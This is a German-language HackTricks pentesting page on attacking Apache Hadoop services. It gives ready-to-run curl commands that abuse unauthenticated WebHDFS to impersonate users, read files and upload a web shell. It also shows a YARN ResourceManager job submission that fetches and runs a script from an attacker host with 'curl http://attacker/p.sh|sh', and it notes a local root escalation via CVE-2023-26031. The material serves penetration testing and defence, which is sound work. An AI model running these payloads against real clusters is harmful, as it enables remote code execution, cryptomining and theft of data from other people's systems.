# 50030-50060-50070-50075-50090 - Pentesting Hadoop

{{#include ../banners/hacktricks-training.md}}

## **Grundlegende Informationen**

**Apache Hadoop** ist ein **Open-Source-Framework** für die **verteilte Speicherung und Verarbeitung** großer **Datensätze** über **Cluster von Rechnern**. Es verwendet **HDFS** für die Speicherung und **MapReduce** für die Verarbeitung.

Nützliche Standard-Ports:

- **50070 / 9870** NameNode (WebHDFS)
- **50075 / 9864** DataNode
- **50090** Secondary NameNode
- **8088** YARN ResourceManager Web-UI & REST
- **8042** YARN NodeManager
- **8031/8032** YARN RPC (wird oft übersehen und in vielen Installationen weiterhin ohne Authentifizierung gelassen)

Leider fehlt Hadoop zum Zeitpunkt der Dokumentation Unterstützung im Metasploit-Framework. Du kannst jedoch die folgenden **Nmap-Skripte** verwenden, um Hadoop-Dienste zu enumerieren:

- **`hadoop-jobtracker-info (Port 50030)`**
- **`hadoop-tasktracker-info (Port 50060)`**
- **`hadoop-namenode-info (Port 50070)`**
- **`hadoop-datanode-info (Port 50075)`**
- **`hadoop-secondary-namenode-info (Port 50090)`**

Wichtig ist zu beachten, dass **Hadoop in der Standardkonfiguration ohne Authentifizierung läuft**. Zur Erhöhung der Sicherheit gibt es jedoch Konfigurationsmöglichkeiten, Kerberos in HDFS-, YARN- und MapReduce-Dienste zu integrieren.

## WebHDFS / HttpFS Missbrauch (50070/9870 or 14000)

Wenn **security=off** kannst du dich mit dem `user.name`-Parameter als beliebiger Benutzer ausgeben. Einige schnelle Primitive:
```bash
# list root directory
curl "http://<host>:50070/webhdfs/v1/?op=LISTSTATUS&user.name=hdfs"

# read arbitrary file from HDFS
curl -L "http://<host>:50070/webhdfs/v1/etc/hadoop/core-site.xml?op=OPEN&user.name=hdfs"

# upload a web shell / binary
curl -X PUT -T ./payload "http://<host>:50070/webhdfs/v1/tmp/payload?op=CREATE&overwrite=true&user.name=hdfs" -H 'Content-Type: application/octet-stream'
```
Wenn HttpFS aktiviert ist (Standardport **14000**), gelten dieselben REST-Pfade. Hinter Kerberos können Sie weiterhin `curl --negotiate -u :` mit einem gültigen Ticket verwenden.

## YARN unauth RCE (8088)

Die **ResourceManager REST API** akzeptiert das Einreichen von Jobs ohne Authentifizierung im Standard-„simple“-Modus (`dr.who`). Angreifer missbrauchen dies, um beliebige Befehle auszuführen (z. B. miners), ohne HDFS-Schreibzugriff zu benötigen.
```bash
# 1) get an application id
curl -s -X POST http://<host>:8088/ws/v1/cluster/apps/new-application

# 2) submit DistributedShell pointing to a command
curl -s -X POST http://<host>:8088/ws/v1/cluster/apps \
-H 'Content-Type: application/json' \
-d '{
"application-id":"application_1234567890000_0001",
"application-name":"pwn",
"am-container-spec":{
"commands":{"command":"/bin/bash -c \"curl http://attacker/p.sh|sh\""}
},
"application-type":"YARN"
}'
```
Wenn der Port **8031/8032 RPC** offen ist, erlauben ältere Cluster die gleiche Job-Übermittlung über protobuf ohne auth (dokumentiert in mehreren cryptominer campaigns) – behandle diese Ports ebenfalls als RCE.

## Lokaler PrivEsc von YARN containers (CVE-2023-26031)

Hadoop 3.3.1–3.3.4 **container-executor** lädt libs aus einem **relativen RUNPATH**. Ein Benutzer, der YARN containers ausführen kann (einschließlich remote submitters auf unsicheren Clustern), kann eine bösartige `libcrypto.so` in einen schreibbaren Pfad ablegen und **root** erhalten, wenn `container-executor` mit SUID läuft.

Schnellprüfung:
```bash
readelf -d /opt/hadoop/bin/container-executor | grep 'RUNPATH\|RPATH'
# vulnerable if it contains $ORIGIN/:../lib/native/
ls -l /opt/hadoop/bin/container-executor   # SUID+root makes it exploitable
```
Behoben in **3.3.5**; stellen Sie sicher, dass die binary nicht SUID ist, wenn secure containers nicht erforderlich sind.

## Referenzen

- [Apache Hadoop offizielle CVE-Liste](https://hadoop.apache.org/cve_list.html)
- [Wiz-Bericht zu CVE-2023-26031](https://www.wiz.io/vulnerability-database/cve/cve-2023-26031)

{{#include ../banners/hacktricks-training.md}}
